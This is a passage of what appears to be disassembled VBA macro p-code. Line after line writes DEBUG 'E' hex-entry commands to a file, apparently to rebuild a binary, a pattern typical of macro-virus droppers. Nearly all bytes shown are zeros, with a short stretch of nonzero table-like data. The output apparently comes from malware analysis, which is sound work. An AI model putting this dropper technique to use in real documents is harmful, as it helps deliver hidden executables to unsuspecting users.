' 	PrintItemNL 
' Line #386:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #387:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #388:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #389:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #390:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #391:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #392:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #393:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #394:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #395:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #396:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #397:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #398:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #399:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #400:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #401:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #402:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #403:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1080 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #404:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1090 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #405:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #406:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #407:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #408:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #409:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #410:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #411:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1100 00 10 00 00 0C 00 00 00 13 30 00 00 00 20 00 00"
' 	PrintItemNL 
' Line #412:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1110 D4 00 00 00 63 30 6B 30 85 30 8B 30 8F 30 95 30"
' 	PrintItemNL 
' Line #413:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1120 9B 30 9F 30 A7 30 AE 30 BC 30 C7 30 DA 30 EC 30"
' 	PrintItemNL 
' Line #414:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1130 37 31 56 31 6D 31 75 31 91 31 97 31 D3 31 00 32"
' 	PrintItemNL 
' Line #415:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1140 11 32 1C 32 39 32 47 32 58 32 72 32 83 32 8C 32"
' 	PrintItemNL 
' Line #416:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1150 A2 32 AB 32 C1 32 CF 32 E0 32 EE 32 03 33 0D 33"
' 	PrintItemNL 
' Line #417:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1160 16 33 21 33 2D 33 3A 33 41 33 47 33 4D 33 7A 30"
' 	PrintItemNL 
' Line #418:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1170 66 32 78 32 58 33 5E 33 53 33 6B 33 77 33 7D 33"
' 	PrintItemNL 
' Line #419:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1180 8A 33 96 33 9C 33 A2 33 A8 33 AE 33 B4 33 C3 33"
' 	PrintItemNL 
' Line #420:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1190 D1 33 E2 33 ED 33 56 34 78 34 7E 34 98 34 A6 34"
' 	PrintItemNL 
' Line #421:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11A0 BE 34 FD 33 08 34 0E 34 19 34 23 34 2E 34 34 34"
' 	PrintItemNL 
' Line #422:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11B0 3F 34 45 34 50 34 87 34 08 35 0C 35 10 35 14 35"
' 	PrintItemNL 
' Line #423:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11C0 18 35 1C 35 20 35 24 35 28 35 2C 35 30 35 34 35"
' 	PrintItemNL 
' Line #424:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11D0 38 35 3C 35 40 35 44 35 48 35 4C 35 00 00 00 00"
' 	PrintItemNL 
' Line #425:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #426:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #427:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #428:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #429:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #430:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #431:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #432:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #433:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #434:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #435:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #436:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #437:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #438:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #439:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #440:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #441:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #442:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #443:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1300 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #444:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1310 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #445:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #446:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1330 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #447:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1340 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #448:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1350 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #449:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1360 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #450:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1370 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #451:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #452:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #453:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #454:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #455:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #456:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #457:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #458:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #459:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #460:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #461:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #462:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #463:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #464:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #465:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #466:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #467:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #468:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #469:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #470:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #471:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #472:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #473:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #474:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #475:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1500 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #476:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1510 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #477:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1520 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #478:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1530 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #479:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1540 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #480:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1550 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #481:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1560 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #482:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1570 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #483:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1580 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #484:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1590 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #485:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #486:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #487:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #488:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #489:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #490:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #491:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #492:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1610 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #493:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #494:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1630 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #495:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #496:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1650 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #497:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1660 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #498:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1670 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #499:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #500:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1690 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #501:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #502:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #503:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #504:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #505:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #506:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #507:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1700 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #508:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1710 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #509:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1720 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #510:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1730 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #511:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1740 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #512:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1750 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #513:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1760 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #514:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1770 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #515:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1780 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #516:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1790 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #517:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #518:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #519:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #520:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #521:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #522:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #523:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1800 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #524:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1810 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #525:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1820 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #526:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1830 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #527:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1840 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #528:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1850 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #529:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1860 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #530:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1870 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #531:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1880 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #532:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1890 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #533:
' 	Ld hFile 
